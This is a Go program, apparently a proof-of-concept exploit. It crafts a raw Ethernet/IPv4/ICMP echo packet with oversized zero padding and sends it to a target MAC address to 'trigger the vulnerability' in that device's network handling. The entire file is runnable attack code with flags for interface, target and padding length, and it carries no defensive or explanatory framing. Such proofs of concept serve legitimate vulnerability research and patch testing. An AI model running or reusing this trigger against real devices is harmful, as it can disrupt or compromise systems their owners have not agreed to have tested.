package main

import (
	"flag"
	"fmt"
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/mdlayher/ethernet"
	"github.com/mdlayher/raw"
)

var zeros [1024 * 128]byte

func main() {
	ifaceFlag := flag.String("i", "", "network interface")
	addrFlag := flag.String("a", "", "destination hardware addr")
	paddingFlag := flag.Int("p", 256, "amount to pad")
	flag.Parse()

	if err := trigger(*ifaceFlag, *addrFlag, *paddingFlag); err != nil {
		log.Fatalf("could not trigger the vulnerability: %v", err)
	}

	log.Println("done")
}

func trigger(ifaceName, destAddr string, paddingLen int) error {
	// get interface
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return err
	}

	// listen to
	c, err := raw.ListenPacket(iface, uint16(ethernet.EtherTypeIPv4), nil)
	if err != nil {
		return err
	}
	defer c.Close()

	dest, err := net.ParseMAC(destAddr)
	if err != nil {
		return err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return fmt.Errorf("could not get addresses")
	}

	var ipAddr string
	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		_, bits := ipNet.Mask.Size()
		if bits == 32 {
			ipAddr = ipNet.IP.String()
			break
		}
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buf, opts,
		&layers.Ethernet{
			SrcMAC:       iface.HardwareAddr,
			DstMAC:       dest,
			EthernetType: layers.EthernetTypeIPv4,
		},
		&layers.IPv4{
			Version:  4,
			Id:       0xcafe,
			Flags:    layers.IPv4DontFragment,
			TTL:      64,
			Protocol: layers.IPProtocolICMPv4,
			SrcIP:    net.ParseIP(ipAddr),
			DstIP:    net.ParseIP("8.8.8.8"),
		},
		&layers.ICMPv4{
			TypeCode: layers.CreateICMPv4TypeCode(
				layers.ICMPv4TypeEchoRequest, 0),
			Id:  1,
			Seq: 1,
		},
	)

	padding, err := buf.AppendBytes(paddingLen)
	if err != nil {
		return err
	}
	copy(padding, zeros[:])

	addr := &raw.Addr{
		HardwareAddr: dest,
	}

	fmt.Printf("Triggering...\n")
	fmt.Printf("IP: %v\n", ipAddr)
	fmt.Printf("Payload: %v\n", buf.Bytes())
	c.WriteTo(buf.Bytes(), addr)

	return nil
}
